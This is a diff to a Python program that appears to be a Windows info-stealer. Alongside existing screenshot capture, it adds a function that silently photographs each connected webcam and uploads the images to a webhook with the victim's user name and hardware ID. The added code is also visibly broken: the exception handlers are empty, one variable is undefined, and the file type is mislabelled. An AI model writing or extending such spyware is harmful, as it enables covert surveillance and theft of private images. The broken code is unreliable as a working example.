@@ -21,6 +21,8 @@ def makeDir():
         os.mkdir("C:/Users/Public/Aqua")
     if not os.path.exists('C:/Users/Public/Aqua/ss'):
         os.mkdir("C:/Users/Public/Aqua/ss")
+    if not os.path.exists('C:/Users/Public/Aqua/Cam'):
+        os.mkdir("C:/Users/Public/Aqua/Cam")
 
 
 def takeSS():
@@ -45,6 +47,34 @@ def takeSS():
     print("Done")
     webhook.execute()
     webhook.remove_files()
+
+def getCam():
+    try:
+        test = 0
+        wmi = win32com.client.GetObject("winmgmts:")
+        for usb in wmi.InstancesOf("Win32_USBHub"):
+            if str(usb.DeviceID).startswith("USB\VID"):
+                print(test)
+                test = test + 1
+            else:
+                pass
+        for x in range(test):
+            try:
+                camera = cv2.VideoCapture(x)
+                for i in range(1):
+                    return_value, image = camera.read()
+                    cv2.imwrite(f'C:/Users/Public/Aqua/Cam/{str(x)}.png', image)
+                    print(f"Webcam[{x}] Done Pic " + str(i))
+                del camera
+                webhook.content = f'```{user} | Webcam Number {x} | HWID: {get_id()}```'
+                webhook.add_file(file_data, f'Aqua_{user}_Cam_{x}.gif')
+                print(f"Done Grabbing Webcam Numb {x}")
+                webhook.execute()
+                webhook.remove_files()
+            except:
+
+    except:
+
 
 
 # Clean Up
